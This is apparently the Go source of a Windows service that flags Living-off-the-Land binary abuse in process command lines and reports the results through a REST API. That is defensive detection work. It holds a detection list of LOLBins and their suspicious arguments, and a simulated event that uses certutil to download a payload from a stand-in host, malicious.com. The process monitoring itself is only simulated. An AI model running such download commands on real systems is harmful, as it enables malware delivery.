// main.go
// Windows LOLBin Process Monitor
// A Go application that monitors process creation events on Windows,
// detects LOLBin abuse, and exposes findings via a REST API.

package main

import (
	"encoding/json"
	"fmt"
	"log"
	"net/http"
	"strings"
	"sync"
	"time"

	"github.com/gorilla/mux"
	"golang.org/x/sys/windows/svc"
	"golang.org/x/sys/windows/svc/debug"
	"golang.org/x/sys/windows/svc/eventlog"
)

// ProcessEvent represents a process creation event
type ProcessEvent struct {
	Timestamp      time.Time `json:"timestamp"`
	ProcessID      uint32    `json:"process_id"`
	ParentID       uint32    `json:"parent_id"`
	CommandLine    string    `json:"command_line"`
	ExecutablePath string    `json:"executable_path"`
	IsLOLBin       bool      `json:"is_lolbin"`
	Suspicious     bool      `json:"suspicious"`
	Reason         string    `json:"reason,omitempty"`
}

// LOLBin contains information about a Living off the Land binary
type LOLBin struct {
	Name           string   `json:"name"`
	SuspiciousArgs []string `json:"suspicious_args"`
}

// Global variables
var (
	processEvents = []ProcessEvent{}
	eventsMutex   = &sync.RWMutex{}
	lolbins       = map[string]LOLBin{
		"certutil.exe": {
			Name:           "certutil.exe",
			SuspiciousArgs: []string{"-urlcache", "-decode", "-encode", "-decodehex"},
		},
		"regsvr32.exe": {
			Name:           "regsvr32.exe",
			SuspiciousArgs: []string{"/i:http", "/u", "scrobj.dll"},
		},
		"bitsadmin.exe": {
			Name:           "bitsadmin.exe",
			SuspiciousArgs: []string{"/transfer", "/addfile"},
		},
		"wmic.exe": {
			Name:           "wmic.exe",
			SuspiciousArgs: []string{"process", "call", "create"},
		},
		"mshta.exe": {
			Name:           "mshta.exe",
			SuspiciousArgs: []string{"javascript:", "http://", "https://"},
		},
		"powershell.exe": {
			Name:           "powershell.exe",
			SuspiciousArgs: []string{"-e", "-enc", "-encodedcommand", "-nop", "-noprofile", "-w", "hidden"},
		},
		"cmd.exe": {
			Name:           "cmd.exe",
			SuspiciousArgs: []string{"/c", "iex", "invoke-expression", "downloadstring"},
		},
		"rundll32.exe": {
			Name:           "rundll32.exe",
			SuspiciousArgs: []string{"javascript:", "http://", "https://", ".dll,"},
		},
		"msiexec.exe": {
			Name:           "msiexec.exe",
			SuspiciousArgs: []string{"/q", "http://", "https://"},
		},
		"sc.exe": {
			Name:           "sc.exe",
			SuspiciousArgs: []string{"create", "config", "failure"},
		},
	}
)

// Service represents the Windows service
type Service struct{}

// Execute is called when the service is started
func (s *Service) Execute(args []string, r <-chan svc.ChangeRequest, changes chan<- svc.Status) (ssec bool, errno uint32) {
	const cmdsAccepted = svc.AcceptStop | svc.AcceptShutdown
	changes <- svc.Status{State: svc.StartPending}

	// Start monitoring routine
	stopMonitoring := make(chan bool)
	go monitorProcesses(stopMonitoring)

	// Start HTTP server
	go startRESTServer()

	changes <- svc.Status{State: svc.Running, Accepts: cmdsAccepted}

	// Wait for stop signal
	for {
		select {
		case c := <-r:
			switch c.Cmd {
			case svc.Interrogate:
				changes <- c.CurrentStatus
			case svc.Stop, svc.Shutdown:
				changes <- svc.Status{State: svc.StopPending}
				stopMonitoring <- true
				return false, 0
			default:
				log.Printf("Unexpected control request #%d", c)
			}
		}
	}
}

// monitorProcesses starts monitoring process creation events using WMI
func monitorProcesses(stop <-chan bool) {
	log.Println("Starting process monitoring...")

	// In a real implementation, you'd set up process creation monitoring using:
	// 1. Windows Event Log subscription
	// 2. ETW (Event Tracing for Windows)
	// 3. WMI event subscription

	// For now, we'll simulate some process events
	go func() {
		ticker := time.NewTicker(10 * time.Second)
		defer ticker.Stop()

		for {
			select {
			case <-stop:
				return
			case <-ticker.C:
				simulateProcessEvent()
			}
		}
	}()
}

// simulateProcessEvent creates a simulated process event for testing
func simulateProcessEvent() {
	// Simulate some common processes, including LOLBins
	possibleProcesses := []struct {
		path         string
		commandLine  string
		isSuspicious bool
	}{
		{`C:\Windows\System32\cmd.exe`, `cmd.exe /c echo hello`, false},
		{`C:\Windows\System32\powershell.exe`, `powershell.exe -Command "Get-Process"`, false},
		{`C:\Windows\System32\certutil.exe`, `certutil.exe -urlcache -f http://malicious.com/payload.exe C:\temp\payload.exe`, true},
		{`C:\Windows\System32\rundll32.exe`, `rundll32.exe javascript:alert('XSS')`, true},
		{`C:\Program Files\Internet Explorer\iexplore.exe`, `iexplore.exe https://example.com`, false},
		{`C:\Windows\System32\notepad.exe`, `notepad.exe C:\temp\notes.txt`, false},
	}

	// Pick a random process
	processIndex := int(time.Now().UnixNano() % int64(len(possibleProcesses)))
	selectedProcess := possibleProcesses[processIndex]

	// Create the process event
	procEvent := ProcessEvent{
		Timestamp:      time.Now(),
		ProcessID:      uint32(10000 + time.Now().Second()),
		ParentID:       uint32(4), // System
		CommandLine:    selectedProcess.commandLine,
		ExecutablePath: selectedProcess.path,
		IsLOLBin:       false,
		Suspicious:     false,
	}

	// Check if this is a LOLBin and if it's used suspiciously
	procEvent = checkForLOLBin(procEvent)

	// Add to events list
	eventsMutex.Lock()
	processEvents = append(processEvents, procEvent)
	eventsMutex.Unlock()

	// Log suspicious activity
	if procEvent.Suspicious {
		log.Printf("SUSPICIOUS: %s (PID: %d) - %s",
			procEvent.ExecutablePath, procEvent.ProcessID, procEvent.Reason)
	}
}

// checkForLOLBin determines if the process is a LOLBin and if it's being used suspiciously
func checkForLOLBin(event ProcessEvent) ProcessEvent {
	// Extract executable name from path
	parts := strings.Split(event.ExecutablePath, "\\")
	if len(parts) == 0 {
		return event
	}

	execName := strings.ToLower(parts[len(parts)-1])

	// Check if it's in our LOLBin list
	lolbin, found := lolbins[execName]
	if !found {
		return event
	}

	// It's a LOLBin
	event.IsLOLBin = true

	// Check for suspicious arguments
	cmdLine := strings.ToLower(event.CommandLine)
	for _, arg := range lolbin.SuspiciousArgs {
		if strings.Contains(cmdLine, arg) {
			event.Suspicious = true
			event.Reason = fmt.Sprintf("Suspicious use of %s with parameter containing '%s'",
				execName, arg)
			break
		}
	}

	return event
}

// startRESTServer starts the HTTP server for the REST API
func startRESTServer() {
	router := mux.NewRouter()

	// API endpoints
	router.HandleFunc("/api/events", getEvents).Methods("GET")
	router.HandleFunc("/api/events/suspicious", getSuspiciousEvents).Methods("GET")
	router.HandleFunc("/api/events/recent", getRecentEvents).Methods("GET")
	router.HandleFunc("/api/lolbins", getLOLBins).Methods("GET")

	// Start the server
	log.Println("Starting REST API server on :8080...")
	if err := http.ListenAndServe(":8080", router); err != nil {
		log.Printf("Error starting API server: %v", err)
	}
}

// API handler: get all events
func getEvents(w http.ResponseWriter, r *http.Request) {
	eventsMutex.RLock()
	defer eventsMutex.RUnlock()

	w.Header().Set("Content-Type", "application/json")
	json.NewEncoder(w).Encode(processEvents)
}

// API handler: get only suspicious events
func getSuspiciousEvents(w http.ResponseWriter, r *http.Request) {
	eventsMutex.RLock()
	defer eventsMutex.RUnlock()

	suspiciousEvents := []ProcessEvent{}
	for _, event := range processEvents {
		if event.Suspicious {
			suspiciousEvents = append(suspiciousEvents, event)
		}
	}

	w.Header().Set("Content-Type", "application/json")
	json.NewEncoder(w).Encode(suspiciousEvents)
}

// API handler: get recent events (last 100)
func getRecentEvents(w http.ResponseWriter, r *http.Request) {
	eventsMutex.RLock()
	defer eventsMutex.RUnlock()

	w.Header().Set("Content-Type", "application/json")

	count := len(processEvents)
	if count <= 100 {
		json.NewEncoder(w).Encode(processEvents)
		return
	}

	json.NewEncoder(w).Encode(processEvents[count-100:])
}

// API handler: get list of monitored LOLBins
func getLOLBins(w http.ResponseWriter, r *http.Request) {
	w.Header().Set("Content-Type", "application/json")
	json.NewEncoder(w).Encode(lolbins)
}

// InstallService installs the application as a Windows service
func InstallService(name, desc string) error {
	// Code for installing the service would go here
	// Using Windows APIs directly or tools like sc.exe
	return nil
}

// UninstallService removes the Windows service
func UninstallService(name string) error {
	// Code for uninstalling the service would go here
	return nil
}

// Main entry point
func main() {
	isIntSess, err := svc.IsAnInteractiveSession()
	if err != nil {
		log.Fatalf("Failed to determine if running in an interactive session: %v", err)
	}

	// Initialize and name the service
	svcName := "WinLOLBinMonitor"

	if isIntSess {
		// Running as a console application
		fmt.Println("Starting Windows LOLBin Monitor in console mode...")

		// Create and open the event log
		elog, err := eventlog.Open(svcName)
		if err != nil {
			log.Printf("Failed to open event log: %v. Will continue without event logging.", err)
		} else {
			defer elog.Close()
		}

		// Run the service in debug mode
		service := &Service{}
		go func() {
			err = debug.Run(svcName, service)
			if err != nil {
				if elog != nil {
					elog.Error(1, fmt.Sprintf("Service failed: %v", err))
				}
				log.Fatalf("Service failed: %v", err)
				return
			}
		}()

		fmt.Println("Service is running. Press Enter to stop.")
		fmt.Scanln()

		fmt.Println("Shutting down...")
		return
	}

	// Running as a Windows service
	err = svc.Run(svcName, &Service{})
	if err != nil {
		eventlog.Report(eventlog.Error, 1, fmt.Sprintf("Service failed: %v", err))
		return
	}
}
